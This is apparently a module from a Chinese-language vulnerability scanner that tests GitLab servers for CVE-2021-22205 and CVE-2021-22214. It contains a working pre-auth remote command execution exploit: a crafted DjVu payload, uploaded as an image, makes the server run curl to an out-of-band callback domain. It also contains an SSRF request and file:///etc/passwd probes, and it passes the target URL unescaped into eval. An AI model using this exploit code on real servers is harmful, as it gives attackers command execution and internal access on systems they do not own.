#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''

    Gitlab扫描类: 
        1. GitLab Pre-Auth 远程命令执行 
            CVE-2021-22205
                Payload: https://vulhub.org/#/environments/gitlab/CVE-2021-22205/
                反弹shell: https://blog.csdn.net/weixin_46137328/article/details/121551162

        2. Gitlab CI Lint API未授权 SSRF
            CVE-2021-22214
                Payload: https://cloud.tencent.com/developer/article/1851527


file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
file:///C:/Windows/System32/drivers/etc/hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from lib.tool import head
from thirdparty import requests
from time import sleep
import re

class Gitlab():
    def __init__(self):
        self.session = requests.session()
        
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Gitlab'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2021_22205_payloads = [
            {
                'path': 'users/sign_in',
                'data': ''
            },
            {
                'path': 'uploads/user',
                'data': ''
            },
            {
                'path': 'sign_in',
                'data': ''
            },
            {
                'path': 'user',
                'data': ''
            }
        ]
        
        self.cve_2021_22214_payloads = [
            {
                'path': 'api/v4/ci/lint',
                'data': '{ "include_merged_yaml": true, "content": "include:\\n  remote: http://DNSdomain/api/v1/targets/?test.yml"}'
            },
        ]

    def cve_2021_22205_scan(self, url):
        ''' 在 GitLab CE/EE中发现了一个从11.9版本开始的问题, 
            GitLab未正确验证传递给文件解析器的图像文件, 从而导致未经身份验证的远程命令执行
        '''
        sessid = '597d45eba94e6e1651ae4fe7bf3b062e'

        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2021-22205'
        vul_info['vul_method'] = 'GET/POST'
        vul_info['headers'] = {}

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        for payload in range(len(self.cve_2021_22205_payloads)):
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名
            dns_command = 'curl ' + dns_domain

            path = self.cve_2021_22205_payloads[payload]['path']
            target = url + path

            vul_info['path'] = path
            vul_info['target'] = target

            try:
                if (payload in [0, 2]):
                    res1 = self.session.get(
                        target, 
                        timeout=self.timeout, 
                        headers=headers,
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )
                    logger.logging(vul_info, res1.status_code, res1)                        # * LOG

                    csrf_token_re = re.search(r'name="csrf-token" content=".*"', res1.text, re.I|re.M|re.U)

                    if csrf_token_re:
                        csrf_token = csrf_token_re.group(0)
                        csrf_token = csrf_token.rstrip('"').replace('name="csrf-token" content="', '')
                        headers.update({'X-CSRF-Token': csrf_token})
                        del headers['Content-Type']

                        path = self.cve_2021_22205_payloads[payload+1]['path']
                        target = url + path

                        data = b'\x41\x54\x26\x54\x46\x4f\x52\x4d' + \
                        (len(dns_command) + 0x55).to_bytes(length=4, byteorder='big', signed=True) + \
                        b'\x44\x4a\x56\x55\x49\x4e\x46\x4f\x00\x00\x00\x0a\x00\x00\x00\x00\x18\x00\x2c\x01\x16\x01\x42\x47\x6a\x70\x00\x00\x00\x00\x41\x4e\x54\x61' + \
                        (len(dns_command) + 0x2f).to_bytes(length=4, byteorder='big', signed=True) + \
                        b'\x28\x6d\x65\x74\x61\x64\x61\x74\x61\x0a\x09\x28\x43\x6f\x70\x79\x72\x69\x67\x68\x74\x20\x22\x5c\x0a\x22\x20\x2e\x20\x71\x78\x7b' + \
                        dns_command.encode() + \
                        b'\x7d\x20\x2e\x20\x5c\x0a\x22\x20\x62\x20\x22\x29\x20\x29\x0a'

                        files = [('file', ('test.jpg', data, 'image/jpeg'))]

                        res2 = self.session.post(
                            target, 
                            timeout=self.timeout, 
                            headers=headers,
                            files=files, 
                            proxies=self.proxies, 
                            verify=False,
                            allow_redirects=False
                        )
                        logger.logging(vul_info, res2.status_code, res2)                        # * LOG
                        if (md in dns.result(md, sessid)):
                            results = {
                                'Target': target,
                                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                                'Exp': 'https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2021-22205/poc.py',
                                'Request-1(csrf-token)': res1,
                                'Request-2': res2
                            }
                            return results
                    else:
                        continue
                else:
                    continue

            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None


    def cve_2021_22214_scan(self, url):
        ''' Gitlab的CI lint API用于验证提供给gitlab ci的配置文件是否是yaml格式, 
            其include操作支持remote选项, 用于获取远端的yaml, 因此在此处将remote参数设置为本地回环地址, 
            同时由于后端会检查最后扩展名, 加上?test.yaml 即可绕过
        '''
        sessid = '35c4b2b338754840369c3b20a2847f0a'

        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'SSRF'
        vul_info['vul_id'] = 'CVE-2021-22214'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {
            'Content-Type': 'application/json'
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        for payload in self.cve_2021_22214_payloads:
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

            path = payload['path']
            data = payload['data'].replace('DNSdomain', dns_domain)
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2021_22205_scan, url=url),
            thread(target=self.cve_2021_22214_scan, url=url)
        ]

gitlab = Gitlab()
